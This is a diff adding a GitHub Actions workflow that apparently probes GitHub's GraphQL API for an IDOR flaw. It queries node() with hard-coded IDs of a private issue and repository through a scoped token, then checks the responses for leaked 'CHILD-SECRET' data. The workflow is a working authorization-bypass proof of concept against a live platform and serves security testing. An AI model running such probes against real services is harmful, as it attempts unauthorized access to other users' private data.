@@ -1,0 +1,27 @@
+name: gql-node-idor
+on: { workflow_dispatch: {} }
+permissions:
+  issues: read
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: GraphQL node() resolver IDOR (scoped token vs PRIVATE si-child node IDs)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "===STEP1: node(si-child ISSUE id) via scoped token — leak title CHILD-SECRET?==="
+          curl -s -o /tmp/n1 -w "HTTP=%{http_code}\n" -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Content-Type: application/json" \
+            -d '{"query":"{ node(id:\"I_kwDOS60z7c8AAAABFdSPwQ\"){ ... on Issue { number title body repository { nameWithOwner } } } }"}' https://api.github.com/graphql
+          echo "  body: $(head -c 350 /tmp/n1)"
+          echo "===STEP2: node(si-child REPO id) via scoped token — leak repo name/description?==="
+          curl -s -o /tmp/n2 -w "HTTP=%{http_code}\n" -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Content-Type: application/json" \
+            -d '{"query":"{ node(id:\"R_kgDOS60z7Q\"){ ... on Repository { nameWithOwner description isPrivate } } }"}' https://api.github.com/graphql
+          echo "  body: $(head -c 300 /tmp/n2)"
+          echo "===STEP3: direct repository(si-child) query control==="
+          curl -s -o /tmp/n3 -w "HTTP=%{http_code}\n" -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Content-Type: application/json" \
+            -d '{"query":"{ repository(owner:\"jackpas23\",name:\"si-child\"){ name } }"}' https://api.github.com/graphql
+          echo "  body: $(head -c 200 /tmp/n3)"
+          echo ""
+          if grep -qi "CHILD-SECRET\|si-child" /tmp/n1 /tmp/n2; then echo "[IMPACT] GraphQL node() IDOR: PRIVATE si-child data LEAKED to scoped token"; else echo "[RESULT] node() returns null for inaccessible nodes — hardened"; fi
